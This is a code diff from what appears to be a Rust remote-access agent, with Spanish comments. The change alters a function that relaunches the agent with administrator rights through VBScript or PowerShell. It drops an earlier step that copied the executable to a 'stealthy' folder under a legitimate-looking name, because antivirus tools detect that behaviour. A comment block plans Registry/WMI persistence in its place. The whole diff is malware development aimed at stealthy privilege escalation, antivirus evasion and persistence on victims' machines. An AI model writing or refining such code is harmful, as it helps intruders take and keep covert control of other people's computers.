@@ -379,6 +379,7 @@ fn execute_command(command: &str) -> String {
 /// ANTES de elevar, copia el ejecutable a una ubicación sigilosa con nombre legítimo
 /// Una vez elevado, el agente se conecta automáticamente con privilegios admin
 /// y todos los comandos posteriores se ejecutan como admin sin pedir UAC de nuevo
+/// MEJORADO: NO copia archivos (detectado por AVs), ejecuta desde ubicación original
 #[cfg(target_os = "windows")]
 fn elevate_agent() -> String {
     debug_print!("DEBUG: Re-ejecutando agente con privilegios elevados...");
@@ -391,20 +392,12 @@ fn elevate_agent() -> String {
     
     debug_print!("DEBUG: Ruta del agente actual: {}", current_exe.display());
     
-    // PASO 1: Copiar el ejecutable a una ubicación sigilosa con nombre legítimo
-    let stealth_path = match copy_to_stealth_location(&current_exe) {
-        Ok(path) => path,
-        Err(e) => return format!("__ERROR__:Error copiando a ubicación sigilosa: {}{}", e, DELIMITER),
-    };
-    
-    debug_print!("DEBUG: Agente copiado a ubicación sigilosa: {}", stealth_path.display());
-    
-    let exe_str = match stealth_path.to_str() {
+    let exe_str = match current_exe.to_str() {
         Some(s) => s,
         None => return format!("__ERROR__:Ruta inválida{}", DELIMITER),
     };
     
-    // PASO 2: Elevar el nuevo ejecutable desde la ubicación sigilosa
+    // Elevar el ejecutable desde su ubicación actual (SIN copiar)
     // TÉCNICA 1: Intentar VBScript (más sigiloso)
     if let Ok(result) = elevate_agent_via_vbs(exe_str) {
         return result;
@@ -415,6 +408,14 @@ fn elevate_agent() -> String {
     // TÉCNICA 2: PowerShell como fallback
     elevate_agent_via_powershell(exe_str)
 }
+
+/*
+FUNCIÓN DESHABILITADA: copy_to_stealth_location
+Copiar archivos a ubicaciones "sigilosas" es detectado por AVs modernos como comportamiento sospechoso.
+La nueva estrategia es:
+1. NO copiar archivos
+2. Ejecutar desde la ubicación original
+3. Usar persistencia Registry/WMI que no requiere copias
 
 /// Copia el ejecutable a una ubicación sigilosa con nombre legítimo
 /// Ubica el ejecutable en carpetas del sistema que parecen legítimas
@@ -489,11 +490,10 @@ fn copy_to_stealth_location(current_exe: &std::path::Path) -> Result<std::path::
     
     fs::copy(current_exe, &fallback_path)
         .map_err(|e| format!("Error copiando a fallback: {}", e))?;
-    
-    debug_print!("DEBUG: ⚠️  Usando ubicación fallback: {}", fallback_path.display());
-    
     Ok(fallback_path)
 }
+
+*/
 
 /// Re-ejecuta el agente usando VBScript (más sigiloso, sin PowerShell)
 #[cfg(target_os = "windows")]
